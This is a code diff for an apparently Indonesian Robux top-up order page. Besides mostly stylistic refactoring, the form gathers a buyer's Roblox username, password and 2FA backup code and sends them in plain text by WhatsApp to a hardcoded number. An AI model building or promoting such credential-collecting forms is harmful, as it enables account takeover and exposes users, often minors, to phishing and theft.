@@ -1,20 +1,20 @@
 const WHATSAPP_NUMBER = "6283197962700";
 
 function showPopup(title, message, submessage) {
-  const existing = document.getElementById('validationCenterPopup');
+  const existing = document.getElementById("validationCenterPopup");
   if (existing) existing.remove();
 
-  const container = document.getElementById('validationContainer') || document.body;
+  const container = document.getElementById("validationContainer") || document.body;
 
-  const popup = document.createElement('div');
-  popup.id = 'validationCenterPopup';
-  popup.className = 'validation-center';
+  const popup = document.createElement("div");
+  popup.id = "validationCenterPopup";
+  popup.className = "validation-center";
   popup.tabIndex = -1;
 
   popup.innerHTML = `
-    <div class="hdr">${title || 'Notification'}</div>
+    <div class="hdr">${title || "Notification"}</div>
     <div class="divider"></div>
-    <div class="txt">${message || ''}</div>
+    <div class="txt">${message || ""}</div>
     ${submessage ? `<div class="subtxt">${submessage}</div>` : ``}
     <div class="btnRow">
       <button type="button" class="okbtn">OK</button>
@@ -23,33 +23,38 @@ function showPopup(title, message, submessage) {
 
   container.appendChild(popup);
 
-  const okBtn = popup.querySelector('.okbtn');
+  const okBtn = popup.querySelector(".okbtn");
 
   function removePopup() {
-    popup.style.transition = 'opacity 160ms ease, transform 160ms ease';
-    popup.style.opacity = '0';
-    popup.style.transform = 'translate(-50%,-50%) scale(.98)';
+    popup.style.transition = "opacity 160ms ease, transform 160ms ease";
+    popup.style.opacity = "0";
+    popup.style.transform = "translate(-50%,-50%) scale(.98)";
     setTimeout(() => popup.remove(), 170);
   }
 
-  okBtn.addEventListener('click', removePopup);
+  okBtn.addEventListener("click", removePopup);
   popup.focus({ preventScroll: true });
 
   const t = setTimeout(removePopup, 7000);
-  window.addEventListener('pagehide', () => {
-    clearTimeout(t);
-    if (popup) popup.remove();
-  }, { once: true });
+  window.addEventListener(
+    "pagehide",
+    () => {
+      clearTimeout(t);
+      if (popup) popup.remove();
+    },
+    { once: true }
+  );
 }
 
 function formatHarga(harga) {
-  const hargaNumber = typeof harga === 'number'
-    ? harga
-    : Number(String(harga).replace(/[^\d]/g, ''));
+  const hargaNumber =
+    typeof harga === "number"
+      ? harga
+      : Number(String(harga).replace(/[^\d]/g, ""));
 
   return {
     hargaNumber,
-    hargaText: "Rp" + new Intl.NumberFormat('id-ID').format(hargaNumber)
+    hargaText: "Rp" + new Intl.NumberFormat("id-ID").format(hargaNumber),
   };
 }
 
@@ -62,21 +67,26 @@ window.isiForm = function isiForm(nominal, harga, kategori) {
   document.getElementById("kategori").value = kategori;
 
   updateV2LOptions();
-  document.querySelector('.form-section')?.scrollIntoView({ behavior: 'smooth' });
+  document.querySelector(".form-section")?.scrollIntoView({ behavior: "smooth" });
 };
 
 function updateV2LOptions() {
-  const v2lVal = document.getElementById("v2l").value;
+  const v2lEl = document.getElementById("v2l");
   const metodeSelect = document.getElementById("metodeV2L");
   const metodeDiv = document.getElementById("metodeV2L_div");
   const backupDiv = document.getElementById("backupCode_div");
   const emailDiv = document.getElementById("emailNote_div");
 
+  if (!v2lEl || !metodeSelect || !metodeDiv || !backupDiv || !emailDiv) return;
+
+  const v2lVal = String(v2lEl.value || "").trim().toUpperCase();
+
   if (v2lVal !== "ON") {
     metodeDiv.classList.add("hidden");
     backupDiv.classList.add("hidden");
     emailDiv.classList.add("hidden");
-    metodeSelect.innerHTML = '';
+    metodeSelect.innerHTML = "";
+    metodeSelect.value = "";
     return;
   }
 
@@ -84,10 +94,11 @@ function updateV2LOptions() {
 
   const previousValue = metodeSelect.value;
 
-  metodeSelect.innerHTML =
-    '<option value="">-- Pilih Metode --</option>' +
-    '<option value="Backup Code">Backup Code</option>' +
-    '<option value="Kode Email">Kode Email</option>';
+  metodeSelect.innerHTML = `
+    <option value="">-- Pilih Metode --</option>
+    <option value="Backup Code">Backup Code</option>
+    <option value="Kode Email">Kode Email</option>
+  `;
 
   if (previousValue === "Backup Code" || previousValue === "Kode Email") {
     metodeSelect.value = previousValue;
@@ -109,67 +120,82 @@ function updateV2LOptions() {
 
 function resetFormUI(form) {
   form.reset();
-  document.getElementById("backupCode_div").classList.add("hidden");
-  document.getElementById("emailNote_div").classList.add("hidden");
-  document.getElementById("metodeV2L_div").classList.add("hidden");
-  document.getElementById("metodeV2L").innerHTML = '';
+
+  const metodeDiv = document.getElementById("metodeV2L_div");
+  const metodeSelect = document.getElementById("metodeV2L");
+  const backupDiv = document.getElementById("backupCode_div");
+  const emailDiv = document.getElementById("emailNote_div");
+
+  if (metodeDiv) metodeDiv.classList.add("hidden");
+  if (backupDiv) backupDiv.classList.add("hidden");
+  if (emailDiv) emailDiv.classList.add("hidden");
+  if (metodeSelect) {
+    metodeSelect.innerHTML = "";
+    metodeSelect.value = "";
+  }
 }
 
-document.addEventListener('DOMContentLoaded', function () {
-  document.getElementById("v2l")?.addEventListener("change", function () {
+document.addEventListener("DOMContentLoaded", function () {
+  const v2lEl = document.getElementById("v2l");
+  const metodeEl = document.getElementById("metodeV2L");
+  const btnWa = document.getElementById("btnWa");
+
+  updateV2LOptions();
+
+  v2lEl?.addEventListener("change", function () {
     updateV2LOptions();
   });
 
-  document.getElementById("metodeV2L")?.addEventListener("change", function () {
+  metodeEl?.addEventListener("change", function () {
+    const backupDiv = document.getElementById("backupCode_div");
+    const emailDiv = document.getElementById("emailNote_div");
+
     if (this.value === "Backup Code") {
-      document.getElementById("backupCode_div").classList.remove("hidden");
-      document.getElementById("emailNote_div").classList.add("hidden");
+      backupDiv?.classList.remove("hidden");
+      emailDiv?.classList.add("hidden");
     } else if (this.value === "Kode Email") {
-      document.getElementById("emailNote_div").classList.remove("hidden");
-      document.getElementById("backupCode_div").classList.add("hidden");
+      emailDiv?.classList.remove("hidden");
+      backupDiv?.classList.add("hidden");
     } else {
-      document.getElementById("backupCode_div").classList.add("hidden");
-      document.getElementById("emailNote_div").classList.add("hidden");
+      backupDiv?.classList.add("hidden");
+      emailDiv?.classList.add("hidden");
     }
   });
 
-  document.getElementById("btnWa")?.addEventListener("click", function () {
+  btnWa?.addEventListener("click", function () {
     const form = document.getElementById("orderForm");
-    const inputs = form.querySelectorAll("input[required], select[required]");
+    if (!form) return;
 
-    for (const input of inputs) {
-      if (!String(input.value || '').trim()) {
-        showPopup('Notification', 'Oops', 'Harap isi semua kolom yang wajib diisi!');
-        try { input.focus(); } catch (e) {}
-        return;
-      }
+    const username = document.getElementById("username")?.value.trim() || "";
+    const password = document.getElementById("password")?.value.trim() || "";
+    const v2l = document.getElementById("v2l")?.value || "";
+    const metodeV2L = document.getElementById("metodeV2L")?.value || "";
+    const backupCode = document.getElementById("backupCode")?.value.trim() || "";
+    const kategori = document.getElementById("kategori")?.value || "";
+    const nominal = document.getElementById("nominal")?.value || "";
+    const harga = document.getElementById("harga")?.value || "";
+
+    if (!username || !password || !v2l || !kategori || !nominal || !harga) {
+      showPopup("Notification", "Oops", "Harap isi semua kolom yang wajib diisi!");
+      return;
     }
 
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value.trim();
-    const v2l = document.getElementById("v2l").value;
-    const metodeV2L = document.getElementById("metodeV2L").value;
-    const backupCode = document.getElementById("backupCode").value.trim();
-    const kategori = document.getElementById("kategori").value;
-    const nominal = document.getElementById("nominal").value;
-    const harga = document.getElementById("harga").value;
-
-    if (v2l === "ON") {
+    if (String(v2l).toUpperCase() === "ON") {
       if (!metodeV2L) {
-        showPopup('Notification', 'Oops', 'Karena V2L aktif, silakan pilih metode V2L.');
-        document.getElementById("metodeV2L").focus();
+        showPopup("Notification", "Oops", "Karena V2L aktif, silakan pilih metode V2L.");
+        document.getElementById("metodeV2L")?.focus();
         return;
       }
 
       if (metodeV2L === "Backup Code" && !backupCode) {
-        showPopup('Notification', 'Oops', 'Mohon masukkan Backup Code.');
-        document.getElementById("backupCode").focus();
+        showPopup("Notification", "Oops", "Mohon masukkan Backup Code.");
+        document.getElementById("backupCode")?.focus();
         return;
       }
     }
 
     const message =
-      `Pesanan Baru Masuk!\n\n` +
+      `ORDER ROBUX VIA LOGIN\n\n` +
       `Username Roblox: ${username}\n` +
       `Password Roblox: ${password}\n` +
       `V2L: ${v2l}${metodeV2L ? ` (${metodeV2L})` : ""}\n` +
@@ -183,9 +209,9 @@ document.addEventListener('DOMContentLoaded', function () {
     window.open(waUrl, "_blank");
 
     showPopup(
-      'Notification',
-      'Berhasil',
-      'Pesanan sudah disiapkan ke WhatsApp. Silakan lanjut kirim pesan di WhatsApp.'
+      "Notification",
+      "Berhasil",
+      "Pesanan sudah disiapkan ke WhatsApp. Silakan lanjut kirim pesan di WhatsApp."
     );
 
     resetFormUI(form);
